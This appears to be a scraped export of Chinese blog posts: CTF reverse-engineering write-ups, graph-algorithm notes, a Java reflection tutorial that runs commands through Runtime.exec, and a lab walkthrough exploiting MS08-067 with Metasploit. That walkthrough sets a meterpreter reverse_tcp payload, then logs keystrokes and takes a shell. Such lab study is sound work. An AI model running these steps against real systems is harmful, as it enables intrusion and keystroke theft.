char[9]{\u0026#39;t\u0026#39;,\u0026#39;h\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;m\u0026#39;,\u0026#39;o\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;k\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;y\u0026#39;};\r}\rprotected void onCreate(Bundle p0){\rsuper.onCreate(p0);\rthis.setContentView(R.layout.activity_main);\rthis.findViewById(R.id.check).setOnClickListener(new MainActivity$1(this, this.findViewById(R.id.input)));\r}\r} 有用的信息就只有 enc 和 key 两个数组\nenc 是密文，而 key 是对应的密钥\n算法方面的话，一眼可能有点迷糊，其实还是异或😅\n只是按照下标顺序将key与enc进行异或，key的下标超过数组大小就重置为0\n代码如下👇：\n#include \u0026lt;stdio.h\u0026gt;\rchar enc[31] = { 25, 7, 0, 14, 27, 3, 16, \u0026#39;/\u0026#39;, 24, 2, 9, \u0026#39;:\u0026#39;, 4, 1, \u0026#39;:\u0026#39;, \u0026#39;*\u0026#39;, 11, 29, 6, 7, 12, 9, \u0026#39;0\u0026#39;, \u0026#39;T\u0026#39;, 24, \u0026#39;:\u0026#39;, 28, 21, 27, 28, 16 };\rchar key[9] = { \u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;k\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;y\u0026#39; };\rvoid decrypt(char* enc, int encLen, char* key, int keyLen) {\rfor (int i = 0; i \u0026lt; encLen; i++) {\renc[i] = enc[i] ^ key[i % keyLen]; // 使用异或运算解密\r}\r}\rint main() {\rint encLen = sizeof(enc) / sizeof(enc[0]);\rint keyLen = sizeof(key) / sizeof(key[0]);\rdecrypt(enc, encLen, key, keyLen);\rprintf(\u0026#34;Decrypted message: %s\\n\u0026#34;, enc);\rreturn 0;\r} RRRRRc4 #\rDESCRIPTION: 一天dr3找到浮小云，说要给他看个好东西，说着就用神秘的Rc4把浮小云珍贵的flag给弄得一团糟。现在，唯有你能拯救浮小云的flag，将混乱变为秩序！\n主函数是这样的👇其中一些函数名称我做了调整\n其中的RC4函数就是RC4加密函数，其中的变量v7就是解密密钥\n查看一下secret数组的内容，可以看到37位的十六进制密文\n那么现在有了密文，有了密钥可以直接去解密了\n同样来到Cyberchef👇\nSMC #\rDESCRIPTION: smc是一种程序在运行时修改自身的方法\n建议了解一些C语言及逆向基础知识再来尝试\n需要的话可以尝试搜索CTF SMC并尝试例题\n主函数内有点价值的就只有这一个了\n在搜索SMC相关知识后，在该函数内发现类似于smc的东西👇\n可以看到函数地址往后122位逐位都进行了异或操作\n在程序没有运行的时候，显示的函数源码都是乱的👇，只有当程序运行的时候，函数才会还原成能被执行的样子\n那么根据上面的异或加密过程，我们要写一个脚本👇\nimport idc\raddr=0x004014D0\rfor i in range(122):\rb = get_bytes(addr + i, 1)\ridc.patch_byte(addr + i, ord(b) ^ 0x66) 保存在本地然后进入IDA，选择File-\u0026gt;Script file 然后选择这个脚本文件\n那么程序的数据就被我们修改了\n执行完毕后会看到这样👇\n数据是成功被修改了，但是会存在一些db孤立字节，这时候把函数内存区域内的db全部选中按C强制转换为汇编代码，换句话说，执行完脚本后ida解出来的只是碎片，我们要自己拼回去\n保证没有函数区域内没有db字样后，选择菜单里的Edit-\u0026gt;Functions-\u0026gt;Create Function\n然后回到页面点击那个函数，就能看到函数能够被执行的样子\n（这一步没出来可以反复多试几次\n基本逻辑都出来了，密文异或0x39然后减去57就是明文的ascii码\n后面的密文也是看得到的👇\n用LazyIDA插件快速提取密文\n下面是python解密代码👇：\nl=[0x9F, 0x91, 0xA7, 0xA5, 0x94, 0xA6, 0x8D, 0xB5, 0xA7, 0x9C, 0xA6, 0xA1, 0xBF, 0x91, 0xA4, 0x53, 0xA6, 0x53, 0xA5, 0xA3, 0x94, 0x9B, 0x91, 0x9E, 0x8F, 0x00, 0x00]\rfor i in l:\rprint(chr((i^0x39)-57),end=\u0026#39;\u0026#39;) ","date":"2023-08-15","externalUrl":null,"permalink":"/posts/2023/08/moectf-2023/","section":"Posts","summary":"","title":"MoeCTF-2023","type":"posts"},{"content":"\r前言 #\r本文纯属于“照虎画猫”\n体验一下经典漏洞的复现过程\n对测试过程进行简单的了解\nMS08-067简介 #\rMS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC（Remote Procedure Call，远程过程调用）请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。\n这个漏洞可以影响Windows 2000、XP、 server 2023等系统\n这里就用XP这个经典系统来进行测试\n环境搭建 #\r所需环境： #\r攻击机：Kali linux 2022\n靶机：Windows XP Professional SP3\n这里我看有的博客上写的是 Windows XP Home版（家庭版）\n但是经过测试，似乎并不能成功执行漏洞，于是这里我换了一个专业版的XP\n在迅雷里面下好，然后装进VMware workstation里\n网络环境： #\r要将两个虚拟机能够互相联通\n也就是能Ping通\n首先就要让虚拟机能够联网\n我是把两台机子都用桥接模式，接到了外部的同一个WIFI上\nXP系统查看自己的ip地址👇\n然后在Kali里面查看ip👇\n可以看到XP的ip是：192.168.101.28\n而Kali的ip是：192.168.101.22\n只有最后一段不同，说明两个虚拟机是处于同一局域网下（同一子网\n可以进行互相通信\n接下来试试ping\n可以看到，在XP系统中是能够ping通Kali的\n在Kali中有可能ping不通XP\n只需将XP的防火墙和自动更新关闭，即可\n所需工具： #\rNMAP\nnmap是一款非常强大的主机发现和端口扫描工具，又名诸神之眼（名字感觉就很牛\n能发现目标IP段的存活主机和开放的端口\n一般用来初步收集信息\nMetasploit\nMetasploit是一款开源安全漏洞检测工具，附带数百个已知的软件漏洞，并且提供了整合的利用代码\n被安全社区冠以“可以黑掉整个宇宙”之名的强大渗透测试框架\n这两个工具在Kali系统里面都自带有，所以不必再去下载\n测试 #\r这里就模拟一下什么都不知道的情况\n首先用Nmap扫描目标网段\n查看局域网内存活的主机\nnmap -F 192.168.101.0/24 在Nmap中有多种模式可选，这里用 -F 是快速扫描，其余有很多可选项比如说：-A （aggressive 攻击模式\n这里的具体含义是扫描 192.168.101.0 到192.168.101.255 之间所有存活的机子以及开放的端口\n在这里我们扫描到了 XP的 ip\n也可以尝试使用 -O 的选项来获取具体信息\nnmap -O 192.168.101.0/24 可以看到Nmap已经识别到了这个机子是XP，而且给出了估计的XP版本是sp2或者sp3\n（我的XP机子就是sp3版本的\n而且查看到其445端口是处于开放状态\n能够尝试利用ms08-067漏洞\n首先进入Metasploit的工作状态，运行下面的命令（要在root权限下\nmsfconsole 然后\nsearch ms08-067 在库里面有这个漏洞的利用代码，编号为0，这里用：use 0 就可以了\n然后查看攻击的选项，（show options）看哪些没有填的，我们要填上\n可以看到\nRHOSTS（即remote hosts，我们要攻击的ip）和exploit target是没有选择的\n这里我们要选上\nset rhost 192.168.101.28 然后target的类型要进行选择，这个是选择目标机器的版本号，用show targets查看目录\n第34号是我们目标机器的型号，把target设置成34即可\nset target 34 然后就是我们要进行攻击的方式，即payload\n一般来说常见的就是反转TCP获得shell权限\n这里payload这样设置，当然也可以查看payload目录，看其他的能不能用\nset payload windows/meterpreter/reverse_tcp 设置完后应该是这样的👇\n然后我们输入 run 或者 exploit 进行攻击\n如果出现下面这样，那就说明攻击成功了\n注意，这个session一定要是open状态才算成功获取shell，不然就只是完成了一次攻击，但是攻击无效\n之前我就是用的 SP3 Home版的XP，死活都联不通\n这里要注意的是\nXP上的防火墙、自动更新要关闭\n打开services.msc（资源管理器），保证Computer browser、server、workstation这三个选项的启动\n打开gpedit.msc(组策略)，如下图设置\n然后就来试试拿到shell后能干什么吧\n先输入一个问号？\nmetasploit已经将一些命令进行整合打包，变成选项了\n这里有个比较有意思的 webcam\n顾名思义，能拿到电脑外接摄像头的权限\n当然我这个虚拟机没有摄像头\n那看看另外一个\n其中开启 keyscan_start 就可以监听XP系统上的键盘\n这里实验一下\n由于要储存键入的东西，所以需要一段内存空间\n所以用 ps 命令查看一下XP里的所有进程\n这里我们将键盘输入的东西都存储到id为1552这个进程，explorer.exe相当于桌面\nmigrate 1552 首先\nkeyscan_start 然后进入XP机，创建一个记事本写点东西吧\n然后回到Kali\nkeyscan_dump 可以看到，只要是键盘上按过的，都能被记录下来反弹\n如果是在登录自己的账号时，就可能被记录下来\n当然，这是一个相当强大的工具，能利用的远远不止这些\n比如说我们输入shell，进入windows的命令行\n我们删除刚刚创建的那个文本文件，这里为了方便，重命名为 1\n注意XP里有中文在这里会乱码，应该是编码的问题\n只需要输入 chcp 65001 ，就能将字符集改为GBK简体中文，不会乱码了\n有了shell权限，就基本上所有事都能做😀\n漏洞成因 #\r这个就有点超出能力范围了\n我也解释不太清楚\n只能看看大佬的文章\nMS08_067漏洞学习研究 - 燃烧少年的心 - 博客园 (cnblogs.com)\nWindows漏洞：MS08-067远程代码执行漏洞复现及深度防御 - 华为云开发者联盟 - 博客园 (cnblogs.com)\nMS08-067漏洞原理及详尽分析过程 - FreeBuf网络安全行业门户\n结语 #\r上述测试环节中\n有一些匪夷所思的环节\n比如说关闭防火墙，开启什么什么服务等等\n看似比较繁琐\n其实ms08-067最初是在2008年出现\n那时候还没有针对这个漏洞的补丁\n所以当时来说应该是不需要这么繁琐的🤔\n这篇文章也只是简单的复现一下漏洞的利用过程\n之后会开辟一个新的分类来专门收录这些漏洞的学习和利用\n现在，windows XP的比例还是占有1.26%左右，大约有2520万台电脑上还是XP系统\n就算想利用这个漏洞搞点动作，大部分的XP应该也是打过这个补丁的\n但是也不提倡在现实中进行漏洞攻击\n毕竟容易被蜀黍请去喝茶😰\n还是老实地在虚拟机里学习吧\n","date":"2023-08-10","externalUrl":null,"permalink":"/posts/2023/08/ms08-067-review/","section":"Posts","summary":"","title":"MS08-067漏洞测试","type":"posts"},{"content":"\r什么是反射？ #\r在Java中，反射是指程序在运行时动态地获取类信息、构造对象、调用方法和访问属性的能力。\n换句话说，反射使得程序可以在运行时检查和操作任意一个类的成员变量、方法和构造方法，而不需要在编译时就确定下来。\n这里就简单学习一下如何通过反射达到执行命令\n先看一行简单的代码：\nRuntime.getRuntime().exec(command); //command是需要运行的命令 在 Java 中，java.lang.Runtime 是一个表示运行时环境的类，它提供了与Java虚拟机的运行时交互的方法。\nRuntime则是java.lang.Runtime的一个单例模式，通过调用Runtime.getRuntime()，可以获取到当前运行环境的实例，再通过exec函数进行执行命令\n什么是单例？：可以理解为过一条河只需要最开始建造一座桥就够了，而不是每次过桥都去建造一座桥\n而JVM 和运行时环境之间只有一条连接，因此Runtime是单例的\n修改一下代码，放入idea中运行一下：\nRuntime.getRuntime().exec(\u0026#34;calc.exe\u0026#34;); 就能弹出电脑自带的计算器，当然也可以弹其他的cmd、powershell等等\n那么在Java中，较为重要的方法：\n获取类的方法： forName\n实例化类对象的方法： newInstance //调用默认的无参构造器\n获取函数的方法： getMethod\n执行函数的方法： invoke\n获取类的方法：这里的类是指java.lang.Class的对象，而非某个实例\nobj.getClass() 如果前后存在某个类的实例obj，那么可以通过该实例调用函数来获得实例的类\n而 Class.forName 与通过实例获取类不同的是，只需知道这个类的名字就可以，而且方便的是，通过forName获取非系统类并不需要通过import\n基本思路 #\r那么如何通过反射来获得Runtime类呢？\n结合文章开头的那一行代码，可以发现使用Runtime类来进行命令执行的基本思路：\n首先肯定要获取到Runtime类的实例，这样才能调用getRuntime\n然后调用类里的getRuntime函数来获取当前运行环境的实例\n最后调用exec，进行命令执行\n基本代码👇\nimport java.lang.reflect.Method;\rpublic class Main {\rpublic static void main(String[] args) throws Exception{\rClass c=Class.forName(\u0026#34;java.lang.Runtime\u0026#34;);\rMethod getRuntime=c.getMethod(\u0026#34;getRuntime\u0026#34;);\rObject obj=getRuntime.invoke(c);\rMethod m=c.getMethod(\u0026#34;exec\u0026#34;, String.class);\rm.invoke(obj,\u0026#34;calc.exe\u0026#34;);\r}\r} 简单地看看这段代码吧，为了方便看，把每一步都分开了\n首先通过Class.forName拿到Runtime类，但是这时c并不是一个Runtime类的实例\n然后我们要获取到getRuntime函数，这里用了getMethod方式通过函数名称就能获得函数，因为c的属性并不是Runtime，即使method为公有静态也无法通过c来获取\n然后就到了 obj 这一步，为什么会有这一步？原因就在于Runtime是单例的，其构造方法是私有的，无法通过外部来进行构造，只能通过c来使用getRuntime函数来返回一个Runtime类，使得obj变为Runtime\n相当于 Object obj -\u0026gt; Runtime obj\n可以本地调试一下👇\n此时obj的属性就是Runtime，也就是说成功获取了一个Runtime类的实例\n然后再通过这个Runtime类来调用exec函数即可进行命令执行\n弹个计算器👇\n当然也可以弹个cmd👇\n关于 invoke 函数的使用\ninvoke(Object obj, Object\u0026hellip; ，args) 是method 类中的方法，这个方法是一个native方法\nobj: 调用类的实例对象\nargs:调用发方法的参数，是可变长度的\n通过 method.invoke(obj , args ) 可以实现method 方法的调用，并通过args 参数传参\n有点类似于倒装的形式哈，以为主体调用对象\n两个问题 #\r如果一个类没有无参构造，也没有单例模式的静态方法，如何通过反射实例该类？\n如果一个方法是私有的，能否执行？\n对于一个问题，需要用到一个新的反射方法 getConstructor，从名字就能看出来，get constructor，拿到构造器，然后使用ProcessBuilder这个类来进行命令执行，因为这个类没有无参构造，也不是单例\n_#ProcessBuilder类：_用于创建和管理子进程的类，提供了一种方便的方式来执行外部命令或启动其他应用程序，这个类中常用的方法：\nstart()：启动子进程并返回一个 Process 对象。\ncommand(String... command)：设置要执行的命令或应用程序。\n代码如下👇\nimport java.lang.reflect.Constructor;\rimport java.lang.reflect.Method;\rimport java.util.Arrays;\rimport java.util.List;\rpublic class Main {\rpublic static void main(String[] args) throws Exception{\rClass c=Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;);\rConstructor cons=c.getConstructor(List.class);\rMethod m=c.getMethod(\u0026#34;start\u0026#34;);\rProcessBuilder p=(ProcessBuilder) cons.newInstance(Arrays.asList(\u0026#34;calc.exe\u0026#34;));\rm.invoke(p);\r}\r} 首先通过forName获取到ProcessBuilder这个类\n然后通过getConstructor获取到他的构造函数，并将构造函数的参数指定为列表形式\n然后要获得Process类的启动函数start\n最后使用获取到的constructor来实例化ProcessBuilder，进而start执行命令\n来看看ProcessBuilder自带的构造函数👇\n除了List形式传入参数，还有一个直接传入字符串形式\n就第二种形式而言，括号内的参数是 String . . . 这种形式，其实就相当于 String[ ]\n想要通过传入字符串的话，代码就要这样修改👇\nimport java.lang.reflect.Constructor;\rimport java.lang.reflect.Method;\rimport java.util.Arrays;\rimport java.util.List;\rpublic class Main {\rpublic static void main(String[] args) throws Exception{\rClass c=Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;);\rConstructor cons=c.getConstructor(String[].class);\rMethod m=c.getMethod(\u0026#34;start\u0026#34;);\rProcessBuilder p=(ProcessBuilder) cons.newInstance((Object) new String[]{\u0026#34;cmd\u0026#34;,\u0026#34;/c\u0026#34;,\u0026#34;start\u0026#34;,\u0026#34;cmd\u0026#34;});\rm.invoke(p);\r}\r} 有点差异的就是在newInstance里面\nnew的String[ ]其实是一个字符串数组\n而newInstance有两种重载模式，如果有参数的话这个参数必须是对象\n所以在代码中要进行类型转换\n那么第二个问题，如何调用私有方法？\n这个问题就涉及到了 getDeclared系列的反射\ngetDeclared与getMethod、getConstructor的区别：\ngetMethod只能获得公有方法，包括自身和继承而来的方法\ngetDeclaredMethod系列的话，从名字就能看出，能获得声明过的方法，但仅限于本类，不包括继承\n使用方法的话都大差不差\n上面说过，Runtime这个类的构造方法是私有的，在上面只能通过getRuntime函数来返回一个Runtime类\n那么如果使用getDeclared，代码👇\nimport java.lang.reflect.Constructor;\rpublic class Main {\rpublic static void main(String[] args) throws Exception{\rClass clazz = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;);\rConstructor m = clazz.getDeclaredConstructor();\rm.setAccessible(true);\rclazz.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(m.newInstance(), \u0026#34;calc.exe\u0026#34;);\r}\r} 首先肯定要获得Runtime类\n然后通过getDeclaredConstructor来获取Runtim类的无参构造\n这里使用了一个setAccessbile的方法，以为Runtime的构造是私有的，需要重新设置他的作用域，否则是不能调用的\n然后就能直接通过constructor来newinstance，效果和通过类来newinstance是一样的\n不过这段代码在我电脑上跑不起来，可能是jdk版本的原因，在setAccessible这里报了错误，不过代码应该是没有问题的\n学习参考：\n《Java安全漫谈》-反射篇\n","date":"2023-07-27","externalUrl":null,"permalink":"/posts/2023/07/java-reflection/","section":"Posts","summary":"","title":"Java-反射","type":"posts"},{"content":"","date":"2023-07-27","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"","date":"2023-07-17","externalUrl":null,"permalink":"/categories/algorithm/","section":"Categories","summary":"","title":"Algorithm","type":"categories"},{"content":"","date":"2023-07-17","externalUrl":null,"permalink":"/tags/%E7%AE%97%E6%B3%95/","section":"Tags","summary":"","title":"算法","type":"tags"},{"content":"在之前的文章写过两种搜索方式\n深度优先搜索 and 广度优先搜索\n然后用这两种搜索方式来解决了图的一些问题\n这里学习几种新的算法\nFloyd-Warshall #\r简单了解一下👇\n介绍：Floyd-Warshall算法是有Floyd于1962年提出，其可以计算有向图中任意两点之间的最短路径，此算法利用动态规划的思想将计算的时间复杂度降低为 O(v^3) 【在这里我就简称 FW算法 了😋\n动态规划是后面的问题了，先了解一下这个算法的逻辑就好\n先来一个有向图👇\n根据以往的经验，要求两个点的距离变短，只能引入第三个点\n比如 a→b 引入顶点k，则变为 a→k→b\n比较引入前后的距离大小，来判断这个点是否引入有效，有效则更新最短路径\n请结合上图，顶点 1 到顶点 3，引入顶点 2 则得到最短路径\n不过有的时候可能要引入的不止一个点，而是两个点，三个点……\n比如说图上的顶点 4 到顶点 3，要引入顶点 1 、顶点 2 ，才能得到最短路径\n写代码时，同样也要录入图和边\n以下标代表顶点，值代表边长\n基于这种引入点的思想，写出一个代码模型👇\nfor (int i = 1; i \u0026lt;= n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (a[i][j] \u0026gt; a[i][1] + a[1][j])\ra[i][j] = a[i][1] + a[1][j];\r}\r} 从代码中可以看出，我们以顶点 1 为引入点，来获得其余点的最短距离\n当然，如果要获得全部点的最短距离，那就得把所有点都引入一遍\n整体代码如下👇\n#include\u0026lt;stdio.h\u0026gt;\tint n, m;\rint a[51][51];\rint main()\r{\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (i == j)\ra[i][j] = 0;\relse\ra[i][j] = 99999999;//假设无穷远\r}\r}\rfor (int i = 1; i \u0026lt;= m; i++)\r{\rint x, y, dis;\rscanf_s(\u0026#34;%d %d %d\u0026#34;, \u0026amp;x, \u0026amp;y, \u0026amp;dis);\ra[x][y] = dis;//有向图这样写\r}\r//FW算法核心代码就这三个循环嵌套\rfor (int k = 1; k \u0026lt;= n; k++)\r{\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (a[i][j] \u0026gt; a[i][k] + a[k][j])\ra[i][j] = a[i][k] + a[k][j];\r}\r}\r}\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (i != j)\r{\rprintf(\u0026#34;%d 到 %d 的最短距离是 %d\\n\u0026#34;, i, j, a[i][j]);\r}\r}\r}\rreturn 0;\r} ok，来具体剖析一下代码\n引入一个点的时候好理解吧\n那么引入多个点的时候，如何来理解代码呢？\n拿上面那个图的顶点 4，到顶点 3，来举例子\n很明显顶点 4 到顶点 3的直线距离为 12，要引入顶点 1和2，这应该看两眼就能得出的结论\n但是计算机不会看，只能执行代码\n首先，顶点 4 到顶点 1的最短距离是能求的吧，用FW算法能得出距离是5\n然后顶点 4 到顶点 2的最短距离也是能求的（引入点 1），得出是7\n那么要求顶点 4到顶点 3的时候，就尝试以另外几个点为跳板引入\n其实最后实际上求得的是从顶点 4 到顶点 3，以顶点 2 为引入点获得的的最短距离\n其他的点以此类推，核心代码就是三个嵌套的for循环，最外层为引入点（跳板），内部为比较\nDijkstra #\r名字奇奇怪怪的。。。\n这部分学习一个指定一个点到其余各点的最短路径，也叫做“单源最短路径”\n例如求下图的 1 号顶点到其余各点的最短路径👇\n和上面的FW算法一样，还是用二维数组储存点和边的关系\n不过要另外开一个一维数组，来储存指定点和目标点的距离\n这里以顶点 1为指定点，求到其他个点的最短距离\n那么开一个数组，先进行模糊储存\n目前dis数组中的数据都是估计值\ndis[2]=1，则说明从顶点 1 到顶点 2 的模糊距离为1（是直接判断的两点之间的距离，并没有经过第三点），两点无法直达则默认为无限远\n那么现在，dis[2]就成为了一个确切值，因为随意引入一个新点，距离都会大于两点直达\n能够发现，dis[3]=12，而dis[2]+a[2][3]=1+9=10\u0026lt;12，那么说明从点1到点3能够通过点2作为跳板，缩短距离（专业术语叫“松弛”）\n那么以顶点 2 为跳板松弛过后，dis数组为：\n因为刚刚已经利用顶点 2 做了一次跳板，那么就不能再利用顶点2了，要尝试以其他点为跳板进行松弛\n上面忘了说，选跳板也是有顺序的，应该先近后远的顺序（以离目标点最近的开始\n这样来看，下面就要以顶点4为跳板进行松弛\n可以看到 dis[3]=10 \u0026lt; dis[4]+a[4][3]=8\n那么 dis[3]的值更新为了8，又因为顶点4又对顶点5、6有出边，因此顶点5、6也更新了估计值\n为了区分确切值和估计值，用了颜色区分，橙色代表确切值👇\n何时为确切？何时为估计？：\n由于跳板的选择顺序是由近及远的，那么跳板的直达距离肯定是两点之间最短的\n具体请以最开始的那个dis数组图为例子，顶点 1能直达的点只有顶点2、3、4，其中到顶点 2的距离又是最短的（短于点1到点3、4的直达距离），那么这时就有可能经过顶点 2，使得从点1到其他点的路径缩短\n因为点1到点2的直达距离是最短的，就不可能通过其他点做跳板缩短距离咯（三角形的两边大于第三边😛）那么这时到点 2 的距离就成为了确切值，其他没有做过跳板的仍然为估计值\n为何不由远及近选取跳板？ 答：少做无用功\n过程简言之：每次找离源点最近的一个点，然后以点为跳板扩散，作为跳板的点一定是与目标点两点之间直达最近的\n那么下面按照距离，以顶点 3为跳板，得到下图👇\n再以顶点 5为跳板，得到下图👇\n那么最后到要使用顶点 6 为跳板，不过因为在单向图中，顶点 6，并没有出边，代入算法后他自身就是确切值\n小总结：Dijkstra算法是单源的（从一固定点到其余点），那么在储存图的时候要进行模糊处理，能直达的储存直达距离，不能直达的就模糊处理为正无穷远，并在源点能直达的点中按照由近及远的顺序选取跳板，利用跳板来尝试缩短源点到其余点的距离。跳板是除开源点，每一个点都要做一遍的。\nOk，算法的思路就讲到这里，下面是代码实现👇：\n#include\u0026lt;stdio.h\u0026gt;\tint a[51][51];\rint n, m;\rint dis[51];\rint book[51];\rint main()\r{\rint inf = 99999999;//设置inf为正无穷大\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (i == j)\ra[i][j] = 0;\relse\ra[i][j] = inf;//模糊处理为无限远，即不可到达\r}\r}//初始化图\rfor (int i = 1; i \u0026lt;= m; i++)\r{\rint x, y, d;\rscanf_s(\u0026#34;%d %d %d\u0026#34;, \u0026amp;x, \u0026amp;y, \u0026amp;d);\ra[x][y] = d;//单向图写法\r}\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rdis[i] = a[1][i];//顶点1到个点的距离用数组储存起来\r}\rbook[1] = 1;\rint turning=1;//这里的数值无所谓，反正下面选取跳板时会更新\r//下面为Dijkstra核心算法\rfor (int i = 1; i \u0026lt;= n-1; i++)//注意是到n-1，即除了源点，其余点都要做一次跳板\r{\rint min = inf;\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (book[j] == 0 \u0026amp;\u0026amp; dis[j] \u0026lt; min)\r{\rmin = dis[j];\rturning = j;\r}\r}//每次找到离顶点1最近的那个点，即turning，下面要尝试以turning为跳板引入\rbook[turning] = 1;\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rif (a[turning][i] \u0026lt; inf)//假设turning到点i直线可达\r{\rif (dis[i] \u0026gt; dis[turning] + a[turning][i])\r{\rdis[i] = dis[turning] + a[turning][i];\r}\r}\r}\r}\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, dis[i]);\r}\rreturn 0;\r} 可以输入数据进行验证：\n6 9\r1 2 1\r1 3 12\r2 3 9\r2 4 3\r3 5 5\r4 3 4\r4 5 13\r4 6 15\r5 6 4\r运行结果：0 1 8 4 13 17 缺点：Dijkstra算法是不能解决带有负权边的图的\n原因看下面的图👇：\n如果是图1 的情况，首先顶点 0，到顶点1、2能直达有距离，且点0→点2的距离是最短的，那么根据算法，点0→2这条线就应该是确切的，点2又没有出边，那么点2就做不了跳板被忽略，就该轮到点1做跳板，但是引入点1后，又会使得原本是确切值的点0→2 改变，这就与算法逻辑矛盾，这仅是三个点，点多了就会出现更多错误\n在时间复杂度上，可以使用三个一维数组实现邻接表来代替二维的邻接矩阵，这样会使运行速度快一些\n邻接表的实现方式👇：\nint n, m, i;\rint u[6], v[6], w[6];//两点及其距离\rint first[5], next[5];//first要大于n的最大值，next要大于m的最大值\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;= n; i++)\rfirst[i] = -1;//设置成无法引用的下标\rfor (int i = 1; i \u0026lt;= m; i++)//对每一条边进行录入\r{\rscanf_s(\u0026#34;%d %d %d\u0026#34;, \u0026amp;u[i], \u0026amp;v[i], \u0026amp;w[i]);\rnext[i] = first[u[i]];\rfirst[u[i]] = i;//这两步至关重要\r} 以邻接表方式储存，后储存的边会在先储存的边上面，即更先访问到后储存的点和边\nfirst[u[i]]保存顶点为u[i]的第一条边（最新的那条），next[i]用于储存第一条边后面的边\n以这样的方式访问👇，比如说找到1号顶点的第一条边（其实是最后输入的），剩下的边都可以在next数组里找到\nfor (int i = 1; i \u0026lt;= n; i++) {\rk = first[1];\rwhile (k != -1)\r{\rprintf(\u0026#34;%d %d %d\u0026#34;, u[i], v[i], w[i]);\rk = next[k];\r}\r} 假如输入以下数据验证：\n4 5\r1 4 9\r4 3 8\r1 2 5\r2 4 6\r1 3 7 那么找到顶点1的第一条边之后，剩余的边都可以在next数组里找到\n邻接表有点抽象哈，再琢磨琢磨这个东西吧😩\nBellman-Ford #\r这是一个无论是思想还是代码实现，都堪称完美的最短路径算法！😬\n能解决Dijkstra算法由于代码逻辑造成的负权边问题！\n不过仍然是单源\n核心代码只有四行👇：\nfor (int k = 1; k \u0026lt;= n - 1; k++)\rfor (int i = 1; i \u0026lt;= m; i++)\rif (dis[v[i]] \u0026gt; dis[u[i]] + w[i])\rdis[v[i]] = dis[u[i]] + w[i]; 思想还是要借助**跳板**\n不过这里算法更注重的是边，而不是点\n开三个数组为U、V、W，分别储存起点、终点、边长\n核心代码可以理解为根据 三角形的两边之和大于第三边 ，来缩短距离\n对于核心代码循环中的 K，我的理解还是作为跳板（资料上解释的是：n个点之间最多有n-1条单向边，要进行n-1次循环来对每条边进行松弛），因为一定要三个点才能形成三角形嘛\n每实施一次松弛操作，都会有一些顶点求得其最短路径，变为确切值，最坏的情况就是进行了n-1次松弛过后才使所有点完成松弛\n具体代码如下👇：\n#include\u0026lt;stdio.h\u0026gt;\tint dis[10];\rint u[10];\rint v[10];\rint w[10];\rint n, m;\rint inf = 99999999;\rint main()\r{\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;= m; i++)\r{\rscanf_s(\u0026#34;%d %d %d\u0026#34;, \u0026amp;u[i], \u0026amp;v[i], \u0026amp;w[i]);//储存两点以及距离\r}\rfor (int i = 1; i \u0026lt;= n; i++)\rdis[i] = inf;//初步设置为无限远\rdis[1] = 0;\rfor (int i = 1; i \u0026lt;= n - 1; i++)\r{\rfor (int j = 1; j \u0026lt;= m; j++)\r{\rif (dis[v[j]] \u0026gt; dis[u[j]] + w[j])\rdis[v[j]] = dis[u[j]] + w[j];\r}\r}\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, dis[i]);\r}\rreturn 0;\r} 可以输入数据验证：\n5 5 2 3 2\r1 2 -3\r1 5 5\r4 5 2\r3 4 3\r运行结果：0 -3 -1 2 4 这种算法虽然精简，时间复杂度却是要比Dijkstra要高的（省力不省时罢），不过也是可以进行优化\n上面说到，最坏的情况就是对n-1条边进行松弛，那么也可能没有那么多边\n可以简单地在循环中插入一个check变量，查看是否进行过松弛，如果没有，就直接结束算法，避免多余的循环\n要检测一个图是否含有负权回路，那么只需要在所有边完全松弛过后，再遍历一次dis数组，查看是否存在“三角形的斜边大于另外两边之和”的情况\n例如👇：\nfor (int i = 1; i \u0026lt;= n - 1; i++)\r{\rfor (int j = 1; j \u0026lt;= m; j++)\r{\rif (dis[v[j]] \u0026gt; dis[u[j]] + w[j])\r{\rdis[v[j]] = dis[u[j]] + w[j];\r}\r}\r}\rfor (int i = 1; i \u0026lt;= m; i++)\r{\rif (dis[v[i]] \u0026gt; dis[u[i]] + w[i])\rprintf(\u0026#34;含有负权回路\u0026#34;);\r} 思考一下：上面说过，在进行松弛的过程中，会有一些边变为确切值，这些确切值是不会改变的，但是在后续松弛的过程中还是会对已确定的边进行判断，那么这里就会浪费时间。那么是否可以考虑每次仅对估计值变化的顶点的出边进行松弛操作呢？\nBellman-Ford的队列优化 